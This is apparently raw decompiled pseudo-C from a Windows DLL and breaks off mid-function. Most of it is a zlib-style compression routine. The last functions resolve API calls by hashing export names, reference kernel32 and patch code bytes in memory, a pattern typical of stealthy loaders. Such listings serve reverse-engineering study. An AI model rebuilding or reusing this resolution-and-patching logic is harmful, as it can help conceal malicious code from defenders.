/* Function: FUN_10001000 */

void __fastcall FUN_10001000(undefined4 param_1)

{
  int in_EAX;
  
  *(char *)(*(int *)(in_EAX + 8) + *(int *)(in_EAX + 0x14)) = (char)((uint)param_1 >> 8);
  *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
  *(char *)(*(int *)(in_EAX + 0x14) + *(int *)(in_EAX + 8)) = (char)param_1;
  *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
  return;
}



/* Function: FUN_10001030 */

void FUN_10001030(void)

{
  int *piVar1;
  int iVar2;
  int in_EAX;
  uint uVar3;
  
  uVar3 = *(uint *)(*(int *)(in_EAX + 0x1c) + 0x14);
  if (*(uint *)(in_EAX + 0x10) < uVar3) {
    uVar3 = *(uint *)(in_EAX + 0x10);
  }
  if (uVar3 != 0) {
    FUN_1005d740(*(undefined4 *)(in_EAX + 0xc),*(undefined4 *)(*(int *)(in_EAX + 0x1c) + 0x10),uVar3
                );
    *(int *)(in_EAX + 0xc) = *(int *)(in_EAX + 0xc) + uVar3;
    piVar1 = (int *)(*(int *)(in_EAX + 0x1c) + 0x10);
    *piVar1 = *piVar1 + uVar3;
    *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + uVar3;
    *(int *)(in_EAX + 0x10) = *(int *)(in_EAX + 0x10) - uVar3;
    piVar1 = (int *)(*(int *)(in_EAX + 0x1c) + 0x14);
    *piVar1 = *piVar1 - uVar3;
    iVar2 = *(int *)(in_EAX + 0x1c);
    if (*(int *)(iVar2 + 0x14) == 0) {
      *(undefined4 *)(iVar2 + 0x10) = *(undefined4 *)(iVar2 + 8);
    }
  }
  return;
}



/* Function: FUN_10001080 */

uint FUN_10001080(int *param_1,uint param_2)

{
  char cVar1;
  undefined4 *puVar2;
  int *piVar3;
  bool bVar4;
  undefined1 uVar5;
  int iVar6;
  uint uVar7;
  int iVar8;
  uint uVar9;
  
  if (((param_1 == (int *)0x0) || (puVar2 = (undefined4 *)param_1[7], puVar2 == (undefined4 *)0x0))
     || (4 < param_2)) {
    return 0xfffffffe;
  }
  if (((param_1[3] == 0) || ((*param_1 == 0 && (param_1[1] != 0)))) ||
     ((puVar2[1] == 0x29a && (param_2 != 4)))) {
    param_1[6] = (int)PTR_s_stream_error_10082f90;
    return 0xfffffffe;
  }
  if (param_1[4] == 0) {
    param_1[6] = (int)PTR_s_buffer_error_10082f9c;
    return 0xfffffffb;
  }
  iVar8 = puVar2[10];
  *puVar2 = param_1;
  puVar2[10] = param_2;
  if (puVar2[1] == 0x2a) {
    if (puVar2[6] == 2) {
      iVar6 = FUN_10002b20(0,0,0);
      param_1[0xc] = iVar6;
      *(undefined1 *)(puVar2[2] + puVar2[5]) = 0x1f;
      puVar2[5] = puVar2[5] + 1;
      *(undefined1 *)(puVar2[5] + puVar2[2]) = 0x8b;
      puVar2[5] = puVar2[5] + 1;
      *(undefined1 *)(puVar2[5] + puVar2[2]) = 8;
      puVar2[5] = puVar2[5] + 1;
      piVar3 = (int *)puVar2[7];
      if (piVar3 == (int *)0x0) {
        *(undefined1 *)(puVar2[2] + puVar2[5]) = 0;
        puVar2[5] = puVar2[5] + 1;
        *(undefined1 *)(puVar2[5] + puVar2[2]) = 0;
        puVar2[5] = puVar2[5] + 1;
        *(undefined1 *)(puVar2[5] + puVar2[2]) = 0;
        puVar2[5] = puVar2[5] + 1;
        *(undefined1 *)(puVar2[5] + puVar2[2]) = 0;
        puVar2[5] = puVar2[5] + 1;
        *(undefined1 *)(puVar2[5] + puVar2[2]) = 0;
        puVar2[5] = puVar2[5] + 1;
        if (puVar2[0x21] == 9) {
          uVar5 = 2;
        }
        else if (((int)puVar2[0x22] < 2) && (1 < (int)puVar2[0x21])) {
          uVar5 = 0;
        }
        else {
          uVar5 = 4;
        }
        *(undefined1 *)(puVar2[5] + puVar2[2]) = uVar5;
        puVar2[5] = puVar2[5] + 1;
        *(undefined1 *)(puVar2[5] + puVar2[2]) = 0xb;
        puVar2[5] = puVar2[5] + 1;
        puVar2[1] = 0x71;
      }
      else {
        *(byte *)(puVar2[2] + puVar2[5]) =
             (-(piVar3[9] != 0) & 0x10U) + (-(piVar3[0xb] != 0) & 2U) + (-(piVar3[7] != 0) & 8U) +
             (-(piVar3[4] != 0) & 4U) + (*piVar3 != 0);
        puVar2[5] = puVar2[5] + 1;
        *(undefined1 *)(puVar2[5] + puVar2[2]) = *(undefined1 *)(puVar2[7] + 4);
        puVar2[5] = puVar2[5] + 1;
        *(undefined1 *)(puVar2[5] + puVar2[2]) = *(undefined1 *)(puVar2[7] + 5);
        puVar2[5] = puVar2[5] + 1;
        *(undefined1 *)(puVar2[5] + puVar2[2]) = *(undefined1 *)(puVar2[7] + 6);
        puVar2[5] = puVar2[5] + 1;
        *(undefined1 *)(puVar2[5] + puVar2[2]) = *(undefined1 *)(puVar2[7] + 7);
        puVar2[5] = puVar2[5] + 1;
        if (puVar2[0x21] == 9) {
          uVar5 = 2;
        }
        else if (((int)puVar2[0x22] < 2) && (1 < (int)puVar2[0x21])) {
          uVar5 = 0;
        }
        else {
          uVar5 = 4;
        }
        *(undefined1 *)(puVar2[5] + puVar2[2]) = uVar5;
        puVar2[5] = puVar2[5] + 1;
        *(undefined1 *)(puVar2[5] + puVar2[2]) = *(undefined1 *)(puVar2[7] + 0xc);
        puVar2[5] = puVar2[5] + 1;
        iVar6 = puVar2[5];
        if (*(int *)(puVar2[7] + 0x10) != 0) {
          *(undefined1 *)(iVar6 + puVar2[2]) = *(undefined1 *)(puVar2[7] + 0x14);
          puVar2[5] = puVar2[5] + 1;
          *(undefined1 *)(puVar2[5] + puVar2[2]) = *(undefined1 *)(puVar2[7] + 0x15);
          puVar2[5] = puVar2[5] + 1;
          iVar6 = puVar2[5];
        }
        if (*(int *)(puVar2[7] + 0x2c) != 0) {
          iVar6 = FUN_10002b20(param_1[0xc],puVar2[2],iVar6);
          param_1[0xc] = iVar6;
        }
        puVar2[8] = 0;
        puVar2[1] = 0x45;
      }
    }
    else {
      puVar2[1] = 0x71;
      FUN_10001000();
      if (puVar2[0x1b] != 0) {
        FUN_10001000();
        FUN_10001000();
      }
      iVar6 = FUN_10002b40(0,0,0);
      param_1[0xc] = iVar6;
    }
  }
  if (puVar2[1] == 0x45) {
    if (*(int *)(puVar2[7] + 0x10) != 0) {
      uVar9 = puVar2[5];
      if ((uint)puVar2[8] < (uint)*(ushort *)(puVar2[7] + 0x14)) {
        do {
          uVar7 = puVar2[5];
          if (uVar7 == puVar2[3]) {
            if ((*(int *)(puVar2[7] + 0x2c) != 0) && (uVar9 < uVar7)) {
              iVar6 = FUN_10002b20(param_1[0xc],puVar2[2] + uVar9,uVar7 - uVar9);
              param_1[0xc] = iVar6;
            }
            FUN_10001030();
            uVar7 = puVar2[5];
            uVar9 = uVar7;
            if (uVar7 == puVar2[3]) break;
          }
          *(undefined1 *)(uVar7 + puVar2[2]) =
               *(undefined1 *)(*(int *)(puVar2[7] + 0x10) + puVar2[8]);
          puVar2[5] = puVar2[5] + 1;
          puVar2[8] = puVar2[8] + 1;
        } while ((uint)puVar2[8] < (uint)*(ushort *)(puVar2[7] + 0x14));
      }
      if ((*(int *)(puVar2[7] + 0x2c) != 0) && (uVar9 < (uint)puVar2[5])) {
        iVar6 = FUN_10002b20(param_1[0xc],puVar2[2] + uVar9,puVar2[5] - uVar9);
        param_1[0xc] = iVar6;
      }
      if (puVar2[8] != *(int *)(puVar2[7] + 0x14)) goto LAB_10001478;
      puVar2[8] = 0;
    }
    puVar2[1] = 0x49;
  }
LAB_10001478:
  if (puVar2[1] == 0x49) {
    if (*(int *)(puVar2[7] + 0x1c) != 0) {
      uVar9 = puVar2[5];
      do {
        uVar7 = puVar2[5];
        if (uVar7 == puVar2[3]) {
          if ((*(int *)(puVar2[7] + 0x2c) != 0) && (uVar9 < uVar7)) {
            iVar6 = FUN_10002b20(param_1[0xc],puVar2[2] + uVar9,uVar7 - uVar9);
            param_1[0xc] = iVar6;
          }
          FUN_10001030();
          uVar7 = puVar2[5];
          uVar9 = uVar7;
          if (uVar7 == puVar2[3]) {
            bVar4 = true;
            goto LAB_100014f8;
          }
        }
        cVar1 = *(char *)(*(int *)(puVar2[7] + 0x1c) + puVar2[8]);
        puVar2[8] = puVar2[8] + 1;
        *(char *)(uVar7 + puVar2[2]) = cVar1;
        puVar2[5] = puVar2[5] + 1;
      } while (cVar1 != '\0');
      bVar4 = false;
      uVar7 = uVar9;
LAB_100014f8:
      if ((*(int *)(puVar2[7] + 0x2c) != 0) && (uVar7 < (uint)puVar2[5])) {
        iVar6 = FUN_10002b20(param_1[0xc],puVar2[2] + uVar7,puVar2[5] - uVar7);
        param_1[0xc] = iVar6;
      }
      if (bVar4) goto LAB_1000152e;
      puVar2[8] = 0;
    }
    puVar2[1] = 0x5b;
  }
LAB_1000152e:
  if (puVar2[1] == 0x5b) {
    if (*(int *)(puVar2[7] + 0x24) != 0) {
      uVar9 = puVar2[5];
      do {
        uVar7 = puVar2[5];
        if (uVar7 == puVar2[3]) {
          if ((*(int *)(puVar2[7] + 0x2c) != 0) && (uVar9 < uVar7)) {
            iVar6 = FUN_10002b20(param_1[0xc],puVar2[2] + uVar9,uVar7 - uVar9);
            param_1[0xc] = iVar6;
          }
          FUN_10001030();
          uVar7 = puVar2[5];
          uVar9 = uVar7;
          if (uVar7 == puVar2[3]) {
            bVar4 = true;
            goto LAB_100015aa;
          }
        }
        cVar1 = *(char *)(*(int *)(puVar2[7] + 0x24) + puVar2[8]);
        puVar2[8] = puVar2[8] + 1;
        *(char *)(uVar7 + puVar2[2]) = cVar1;
        puVar2[5] = puVar2[5] + 1;
      } while (cVar1 != '\0');
      bVar4 = false;
      uVar7 = uVar9;
LAB_100015aa:
      if ((*(int *)(puVar2[7] + 0x2c) != 0) && (uVar7 < (uint)puVar2[5])) {
        iVar6 = FUN_10002b20(param_1[0xc],puVar2[2] + uVar7,puVar2[5] - uVar7);
        param_1[0xc] = iVar6;
      }
      if (bVar4) goto LAB_100015dd;
    }
    puVar2[1] = 0x67;
  }
LAB_100015dd:
  if (puVar2[1] == 0x67) {
    if (*(int *)(puVar2[7] + 0x2c) != 0) {
      if ((uint)puVar2[3] < puVar2[5] + 2) {
        FUN_10001030();
      }
      if ((uint)puVar2[3] < puVar2[5] + 2) goto LAB_1000163e;
      *(char *)(puVar2[5] + puVar2[2]) = (char)param_1[0xc];
      puVar2[5] = puVar2[5] + 1;
      *(undefined1 *)(puVar2[5] + puVar2[2]) = *(undefined1 *)((int)param_1 + 0x31);
      puVar2[5] = puVar2[5] + 1;
      iVar6 = FUN_10002b20(0,0,0);
      param_1[0xc] = iVar6;
    }
    puVar2[1] = 0x71;
  }
LAB_1000163e:
  if (puVar2[5] == 0) {
    if (((param_1[1] == 0) && ((int)param_2 <= iVar8)) && (param_2 != 4)) {
      param_1[6] = (int)PTR_s_buffer_error_10082f9c;
      return 0xfffffffb;
    }
LAB_1000168a:
    if (puVar2[1] == 0x29a) {
      if (param_1[1] != 0) {
        param_1[6] = (int)PTR_s_buffer_error_10082f9c;
        return 0xfffffffb;
      }
LAB_100016b3:
      if ((puVar2[0x1d] != 0) || ((param_2 != 0 && (puVar2[1] != 0x29a)))) goto LAB_100016cc;
    }
    else {
      if (param_1[1] == 0) goto LAB_100016b3;
LAB_100016cc:
      iVar8 = (*(code *)(&PTR_LAB_1007fba8)[puVar2[0x21] * 3])(puVar2,param_2);
      if ((iVar8 == 2) || (iVar8 == 3)) {
        puVar2[1] = 0x29a;
      }
      if ((iVar8 == 0) || (iVar8 == 2)) {
        if (param_1[4] != 0) {
          return 0;
        }
        puVar2[10] = 0xffffffff;
        return 0;
      }
      if (iVar8 == 1) {
        if (param_2 == 1) {
          FUN_10004450(puVar2);
        }
        else {
          FUN_100043b0(puVar2,0,0,0);
          if (param_2 == 3) {
            *(undefined2 *)(puVar2[0x11] + -2 + puVar2[0x13] * 2) = 0;
            FUN_1005ff60(puVar2[0x11],0,puVar2[0x13] * 2 + -2);
          }
        }
        FUN_10001030();
        if (param_1[4] == 0) goto LAB_10001651;
      }
    }
    if (param_2 == 4) {
      if ((int)puVar2[6] < 1) {
        return 1;
      }
      if (puVar2[6] == 2) {
        *(char *)(puVar2[2] + puVar2[5]) = (char)param_1[0xc];
        puVar2[5] = puVar2[5] + 1;
        *(undefined1 *)(puVar2[5] + puVar2[2]) = *(undefined1 *)((int)param_1 + 0x31);
        puVar2[5] = puVar2[5] + 1;
        *(undefined1 *)(puVar2[5] + puVar2[2]) = *(undefined1 *)((int)param_1 + 0x32);
        puVar2[5] = puVar2[5] + 1;
        *(undefined1 *)(puVar2[5] + puVar2[2]) = *(undefined1 *)((int)param_1 + 0x33);
        puVar2[5] = puVar2[5] + 1;
        *(char *)(puVar2[5] + puVar2[2]) = (char)param_1[2];
        puVar2[5] = puVar2[5] + 1;
        *(undefined1 *)(puVar2[5] + puVar2[2]) = *(undefined1 *)((int)param_1 + 9);
        puVar2[5] = puVar2[5] + 1;
        *(undefined1 *)(puVar2[5] + puVar2[2]) = *(undefined1 *)((int)param_1 + 10);
        puVar2[5] = puVar2[5] + 1;
        *(undefined1 *)(puVar2[5] + puVar2[2]) = *(undefined1 *)((int)param_1 + 0xb);
        puVar2[5] = puVar2[5] + 1;
      }
      else {
        FUN_10001000();
        FUN_10001000();
      }
      FUN_10001030();
      if (0 < (int)puVar2[6]) {
        puVar2[6] = -puVar2[6];
      }
      return (uint)(puVar2[5] == 0);
    }
  }
  else {
    FUN_10001030();
    if (param_1[4] != 0) goto LAB_1000168a;
LAB_10001651:
    puVar2[10] = 0xffffffff;
  }
  return 0;
}



/* Function: FUN_10001860 */

uint FUN_10001860(int param_1)

{
  int iVar1;
  int iVar2;
  
  if ((param_1 == 0) || (iVar1 = *(int *)(param_1 + 0x1c), iVar1 == 0)) {
    return 0xfffffffe;
  }
  iVar2 = *(int *)(iVar1 + 4);
  if ((((iVar2 != 0x2a) && (iVar2 != 0x45)) && (iVar2 != 0x49)) &&
     (((iVar2 != 0x5b && (iVar2 != 0x67)) && ((iVar2 != 0x71 && (iVar2 != 0x29a)))))) {
    return 0xfffffffe;
  }
  if (*(int *)(iVar1 + 8) != 0) {
    (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),*(int *)(iVar1 + 8));
  }
  iVar1 = *(int *)(*(int *)(param_1 + 0x1c) + 0x44);
  if (iVar1 != 0) {
    (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),iVar1);
  }
  iVar1 = *(int *)(*(int *)(param_1 + 0x1c) + 0x40);
  if (iVar1 != 0) {
    (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),iVar1);
  }
  iVar1 = *(int *)(*(int *)(param_1 + 0x1c) + 0x38);
  if (iVar1 != 0) {
    (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),iVar1);
  }
  (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),*(undefined4 *)(param_1 + 0x1c));
  *(undefined4 *)(param_1 + 0x1c) = 0;
  return (iVar2 != 0x71) - 1 & 0xfffffffd;
}



/* Function: FUN_100019d0 */

char * FUN_100019d0(int param_1)

{
  int iVar1;
  char *pcVar2;
  char *pcVar3;
  char *pcVar4;
  char *pcVar5;
  int unaff_ESI;
  
  iVar1 = *(int *)(unaff_ESI + 0x38);
  pcVar2 = (char *)(*(int *)(unaff_ESI + 0x6c) + iVar1);
  if ((*(char *)(iVar1 + param_1) == *pcVar2) && (*(char *)(iVar1 + param_1 + 1) == pcVar2[1])) {
    pcVar5 = (char *)(iVar1 + param_1 + 2);
    pcVar3 = pcVar2 + 2;
    while (((((pcVar4 = pcVar3 + 1, pcVar3[1] == pcVar5[1] &&
              (pcVar4 = pcVar3 + 2, pcVar3[2] == pcVar5[2])) &&
             (pcVar4 = pcVar3 + 3, pcVar3[3] == pcVar5[3])) &&
            ((pcVar4 = pcVar3 + 4, pcVar3[4] == pcVar5[4] &&
             (pcVar4 = pcVar3 + 5, pcVar3[5] == pcVar5[5])))) &&
           ((pcVar4 = pcVar3 + 6, pcVar3[6] == pcVar5[6] &&
            (pcVar4 = pcVar3 + 7, pcVar3[7] == pcVar5[7]))))) {
      pcVar4 = pcVar3 + 8;
      pcVar5 = pcVar5 + 8;
      if ((pcVar3[8] != *pcVar5) || (pcVar3 = pcVar4, pcVar2 + 0x102 <= pcVar4)) break;
    }
    pcVar4 = pcVar4 + (0x102 - (int)(pcVar2 + 0x102));
    if (2 < (int)pcVar4) {
      *(int *)(unaff_ESI + 0x70) = param_1;
      if (pcVar4 <= *(char **)(unaff_ESI + 0x74)) {
        return pcVar4;
      }
      return *(char **)(unaff_ESI + 0x74);
    }
  }
  return (char *)0x2;
}



/* Function: FUN_10001aa0 */

void FUN_10001aa0(void)

{
  ushort *puVar1;
  uint uVar2;
  int *piVar3;
  int iVar4;
  int iVar5;
  short sVar6;
  int iVar7;
  short *psVar8;
  int iVar9;
  uint uVar10;
  uint uVar11;
  int *unaff_ESI;
  uint local_8;
  
  uVar2 = unaff_ESI[0xb];
  do {
    local_8 = (unaff_ESI[0xf] - unaff_ESI[0x1d]) - unaff_ESI[0x1b];
    if (unaff_ESI[0xb] + -0x106 + uVar2 <= (uint)unaff_ESI[0x1b]) {
      FUN_1005d740(unaff_ESI[0xe],unaff_ESI[0xe] + uVar2,uVar2);
      iVar9 = unaff_ESI[0x13];
      unaff_ESI[0x1c] = unaff_ESI[0x1c] - uVar2;
      unaff_ESI[0x1b] = unaff_ESI[0x1b] - uVar2;
      unaff_ESI[0x17] = unaff_ESI[0x17] - uVar2;
      psVar8 = (short *)(unaff_ESI[0x11] + iVar9 * 2);
      do {
        puVar1 = (ushort *)(psVar8 + -1);
        psVar8 = psVar8 + -1;
        if (*puVar1 < uVar2) {
          sVar6 = 0;
        }
        else {
          sVar6 = *puVar1 - (short)uVar2;
        }
        iVar9 = iVar9 + -1;
        *psVar8 = sVar6;
      } while (iVar9 != 0);
      psVar8 = (short *)(unaff_ESI[0x10] + uVar2 * 2);
      uVar10 = uVar2;
      do {
        puVar1 = (ushort *)(psVar8 + -1);
        psVar8 = psVar8 + -1;
        if (*puVar1 < uVar2) {
          sVar6 = 0;
        }
        else {
          sVar6 = *puVar1 - (short)uVar2;
        }
        uVar10 = uVar10 - 1;
        *psVar8 = sVar6;
      } while (uVar10 != 0);
      local_8 = local_8 + uVar2;
    }
    piVar3 = (int *)*unaff_ESI;
    if (piVar3[1] == 0) {
      return;
    }
    iVar9 = unaff_ESI[0x1d];
    iVar4 = unaff_ESI[0x1b];
    uVar10 = piVar3[1];
    iVar5 = unaff_ESI[0xe];
    uVar11 = uVar10;
    if (local_8 < uVar10) {
      uVar11 = local_8;
    }
    if (uVar11 != 0) {
      piVar3[1] = uVar10 - uVar11;
      if (*(int *)(piVar3[7] + 0x18) == 1) {
        iVar7 = FUN_10002b40(piVar3[0xc],*piVar3,uVar11);
LAB_10001b8d:
        piVar3[0xc] = iVar7;
      }
      else if (*(int *)(piVar3[7] + 0x18) == 2) {
        iVar7 = FUN_10002b20(piVar3[0xc],*piVar3,uVar11);
        goto LAB_10001b8d;
      }
      FUN_1005d740(iVar9 + iVar4 + iVar5,*piVar3,uVar11);
      *piVar3 = *piVar3 + uVar11;
      piVar3[2] = piVar3[2] + uVar11;
    }
    unaff_ESI[0x1d] = unaff_ESI[0x1d] + uVar11;
    if (2 < (uint)unaff_ESI[0x1d]) {
      uVar10 = (uint)*(byte *)(unaff_ESI[0x1b] + unaff_ESI[0xe]);
      unaff_ESI[0x12] = uVar10;
      unaff_ESI[0x12] =
           (uVar10 << ((byte)unaff_ESI[0x16] & 0x1f) ^
           (uint)((byte *)(unaff_ESI[0x1b] + unaff_ESI[0xe]))[1]) & unaff_ESI[0x15];
    }
    if (0x105 < (uint)unaff_ESI[0x1d]) {
      return;
    }
    if (*(int *)(*unaff_ESI + 4) == 0) {
      return;
    }
  } while( true );
}



/* Function: FUN_10001dd0 */

byte FUN_10001dd0(int *param_1,int param_2)

{
  int *piVar1;
  byte bVar2;
  int iVar3;
  uint uVar4;
  int iVar5;
  ushort uVar6;
  short sVar7;
  uint uVar8;
  bool bVar9;
  
  uVar8 = 0;
  do {
    uVar4 = param_1[0x1d];
    if (uVar4 < 0x106) {
      FUN_10001aa0();
      uVar4 = param_1[0x1d];
      if ((uVar4 < 0x106) && (param_2 == 0)) {
        return 0;
      }
      if (uVar4 == 0) {
        iVar3 = param_1[0x17];
        if (iVar3 < 0) {
          iVar5 = 0;
        }
        else {
          iVar5 = param_1[0xe] + iVar3;
        }
        FUN_10004640(param_1,iVar5,param_1[0x1b] - iVar3,param_2 == 4);
        param_1[0x17] = param_1[0x1b];
        FUN_10001030();
        if (*(int *)(*param_1 + 0x10) != 0) {
          return (param_2 == 4) * '\x02' + 1;
        }
        return (param_2 != 4) - 1U & 2;
      }
    }
    if (2 < uVar4) {
      uVar8 = (param_1[0x12] << ((byte)param_1[0x16] & 0x1f) ^
              (uint)*(byte *)(param_1[0xe] + 2 + param_1[0x1b])) & param_1[0x15];
      param_1[0x12] = uVar8;
      *(undefined2 *)(param_1[0x10] + (param_1[0xd] & param_1[0x1b]) * 2) =
           *(undefined2 *)(param_1[0x11] + uVar8 * 2);
      uVar8 = (uint)*(ushort *)(param_1[0x10] + (param_1[0x1b] & param_1[0xd]) * 2);
      *(short *)(param_1[0x11] + param_1[0x12] * 2) = (short)param_1[0x1b];
    }
    if (((uVar8 != 0) && (param_1[0x1b] - uVar8 <= param_1[0xb] - 0x106U)) && (param_1[0x22] != 2))
    {
      if (param_1[0x22] == 3) {
        if (param_1[0x1b] - uVar8 == 1) {
          iVar3 = FUN_100019d0(uVar8);
          param_1[0x18] = iVar3;
        }
      }
      else {
        iVar3 = FUN_100048a0(param_1,uVar8);
        param_1[0x18] = iVar3;
      }
    }
    if ((uint)param_1[0x18] < 3) {
      bVar2 = *(byte *)(param_1[0x1b] + param_1[0xe]);
      *(undefined2 *)(param_1[0x5a9] + param_1[0x5a8] * 2) = 0;
      *(byte *)(param_1[0x5a6] + param_1[0x5a8]) = bVar2;
      param_1[0x5a8] = param_1[0x5a8] + 1;
      *(short *)(param_1 + bVar2 + 0x25) = (short)param_1[bVar2 + 0x25] + 1;
      bVar9 = param_1[0x5a8] == param_1[0x5a7] + -1;
      param_1[0x1d] = param_1[0x1d] + -1;
LAB_1000204f:
      param_1[0x1b] = param_1[0x1b] + 1;
    }
    else {
      sVar7 = (short)param_1[0x1b] - (short)param_1[0x1c];
      iVar3 = param_1[0x18];
      *(short *)(param_1[0x5a9] + param_1[0x5a8] * 2) = sVar7;
      bVar2 = (char)iVar3 - 3;
      *(byte *)(param_1[0x5a6] + param_1[0x5a8]) = bVar2;
      param_1[0x5a8] = param_1[0x5a8] + 1;
      *(short *)(param_1 + (byte)(&DAT_10082d10)[bVar2] + 0x126) =
           (short)param_1[(byte)(&DAT_10082d10)[bVar2] + 0x126] + 1;
      uVar6 = sVar7 - 1;
      if (uVar6 < 0x100) {
        bVar2 = (&DAT_10082b10)[uVar6];
      }
      else {
        bVar2 = (&DAT_10082c10)[uVar6 >> 7];
      }
      *(short *)(param_1 + bVar2 + 0x262) = (short)param_1[bVar2 + 0x262] + 1;
      bVar9 = param_1[0x5a8] == param_1[0x5a7] + -1;
      uVar4 = param_1[0x18];
      param_1[0x1d] = param_1[0x1d] - uVar4;
      if ((uVar4 <= (uint)param_1[0x20]) && (2 < (uint)param_1[0x1d])) {
        param_1[0x18] = uVar4 - 1;
        do {
          param_1[0x1b] = param_1[0x1b] + 1;
          uVar8 = ((uint)*(byte *)(param_1[0x1b] + 2U + param_1[0xe]) ^
                  param_1[0x12] << ((byte)param_1[0x16] & 0x1f)) & param_1[0x15];
          param_1[0x12] = uVar8;
          *(undefined2 *)(param_1[0x10] + (param_1[0xd] & param_1[0x1b]) * 2) =
               *(undefined2 *)(param_1[0x11] + uVar8 * 2);
          uVar8 = (uint)*(ushort *)(param_1[0x10] + (param_1[0x1b] & param_1[0xd]) * 2);
          *(short *)(param_1[0x11] + param_1[0x12] * 2) = (short)param_1[0x1b];
          piVar1 = param_1 + 0x18;
          *piVar1 = *piVar1 + -1;
        } while (*piVar1 != 0);
        goto LAB_1000204f;
      }
      param_1[0x1b] = param_1[0x1b] + uVar4;
      param_1[0x18] = 0;
      uVar4 = (uint)*(byte *)(param_1[0x1b] + param_1[0xe]);
      param_1[0x12] = uVar4;
      param_1[0x12] =
           (uVar4 << ((byte)param_1[0x16] & 0x1f) ^
           (uint)((byte *)(param_1[0x1b] + param_1[0xe]))[1]) & param_1[0x15];
    }
    if (bVar9) {
      iVar3 = param_1[0x17];
      if (iVar3 < 0) {
        iVar5 = 0;
      }
      else {
        iVar5 = param_1[0xe] + iVar3;
      }
      FUN_10004640(param_1,iVar5,param_1[0x1b] - iVar3,0);
      iVar3 = *param_1;
      param_1[0x17] = param_1[0x1b];
      uVar4 = *(uint *)(*(int *)(iVar3 + 0x1c) + 0x14);
      if (*(uint *)(iVar3 + 0x10) < uVar4) {
        uVar4 = *(uint *)(iVar3 + 0x10);
      }
      if (uVar4 != 0) {
        FUN_1005d740(*(undefined4 *)(iVar3 + 0xc),*(undefined4 *)(*(int *)(iVar3 + 0x1c) + 0x10),
                     uVar4);
        *(int *)(iVar3 + 0xc) = *(int *)(iVar3 + 0xc) + uVar4;
        piVar1 = (int *)(*(int *)(iVar3 + 0x1c) + 0x10);
        *piVar1 = *piVar1 + uVar4;
        *(int *)(iVar3 + 0x14) = *(int *)(iVar3 + 0x14) + uVar4;
        *(int *)(iVar3 + 0x10) = *(int *)(iVar3 + 0x10) - uVar4;
        piVar1 = (int *)(*(int *)(iVar3 + 0x1c) + 0x14);
        *piVar1 = *piVar1 - uVar4;
        iVar3 = *(int *)(iVar3 + 0x1c);
        if (*(int *)(iVar3 + 0x14) == 0) {
          *(undefined4 *)(iVar3 + 0x10) = *(undefined4 *)(iVar3 + 8);
        }
      }
      if (*(int *)(*param_1 + 0x10) == 0) {
        return 0;
      }
    }
  } while( true );
}



/* Function: FUN_100024b8 */

int FUN_100024b8(int *param_1,int param_2)

{
  byte *pbVar1;
  byte *pbVar2;
  byte bVar3;
  byte bVar4;
  byte *pbVar5;
  int iVar6;
  uint uVar7;
  
  uVar7 = 0;
  if (param_1[3] != 0) {
    do {
      iVar6 = *(int *)(param_1[6] + 0x2c);
      pbVar5 = (byte *)(*(int *)(param_1[4] + uVar7 * 4) + param_1[8]);
      if (pbVar5 != (byte *)0x0) {
        if (*pbVar5 != 0) {
          while (pbVar1 = pbVar5 + 1, *pbVar1 != 0) {
            bVar3 = pbVar5[2];
            if ((bVar3 == 0) || (pbVar5[3] == 0)) break;
            bVar4 = *pbVar5;
            pbVar2 = pbVar5 + 3;
            pbVar5 = pbVar5 + 4;
            iVar6 = (uint)*pbVar2 +
                    ((uint)bVar3 +
                    ((CONCAT11(bVar3,*pbVar1) & 0xff) + ((uint)bVar4 + iVar6 * 2) * 2) * 2) * 2;
            if (*pbVar5 == 0) break;
          }
        }
        bVar3 = *pbVar5;
        while (bVar3 != 0) {
          pbVar5 = pbVar5 + 1;
          iVar6 = (uint)bVar3 + iVar6 * 2;
          bVar3 = *pbVar5;
        }
      }
      if (iVar6 == param_2) {
        return *(int *)(param_1[5] + (uint)*(ushort *)(*param_1 + uVar7 * 2) * 4) + param_1[8];
      }
      uVar7 = uVar7 + 1;
    } while (uVar7 < (uint)param_1[3]);
  }
  return 0;
}



/* Function: FUN_10002558 */

void FUN_10002558(void)

{
  FUN_1047dc5e(PTR_u_kernel32_10095ebc);
  return;
}



/* Function: FUN_10002660 */

undefined4 __fastcall FUN_10002660(undefined4 param_1,uint param_2,undefined4 param_3,int param_4)

{
  char cVar1;
  uint *in_EAX;
  code *pcVar2;
  int *piVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  undefined1 *puVar7;
  int *piVar8;
  char *pcVar9;
  undefined1 *puVar10;
  int unaff_EBP;
  code *unaff_EDI;
  undefined1 **ppuVar11;
  char *pcStack_14;
  undefined1 *puStack_4;
  
  *in_EAX = *in_EAX | param_2;
  puStack_4 = &stack0x00000034;
  pcVar2 = (code *)FUN_100024b8();
  puStack_4 = &stack0x0000001c;
  pcStack_14 = (char *)0x1000267f;
  (*pcVar2)();
  piVar8 = (int *)(DAT_10095ec4 + unaff_EBP);
  iVar5 = piVar8[1];
  piVar3 = piVar8 + 2;
  if (*piVar8 != 0) {
    iVar6 = (*piVar8 - 1U >> 2) + 1;
    do {
      *piVar3 = *piVar3 + iVar5;
      piVar3 = piVar3 + 1;
      iVar6 = iVar6 + -1;
    } while (iVar6 != 0);
  }
  pcVar9 = (char *)((int)piVar8 + DAT_10095e8c);
  pcStack_14 = DAT_10095e90;
  pcVar2 = (code *)FUN_100024b8(&stack0x00000020);
  FUN_100024b8(&stack0x00000020,DAT_10095ea8);
  pcStack_14 = pcVar9 + 1;
  iVar4 = (*pcVar2)();
  iVar6 = DAT_10095ea0 + *pcVar9;
  iVar5 = *(int *)(pcVar9 + *pcVar9 + 8);
  ppuVar11 = &puStack_4;
  puVar10 = (undefined1 *)(*(int *)(*(int *)(iVar4 + 0x3c) + 0x2c + iVar4) + iVar4);
  puStack_4 = (undefined1 *)0x0;
  (*(code *)0x0)(puVar10,iVar5,DAT_10095e94);
  if (iVar5 != 0) {
    puVar7 = puVar10;
    iVar4 = iVar5;
    do {
      *puVar7 = puVar7[(int)(pcVar9 + (iVar6 - (int)puVar10))];
      iVar4 = iVar4 + -1;
      puVar7 = puVar7 + 1;
    } while (iVar4 != 0);
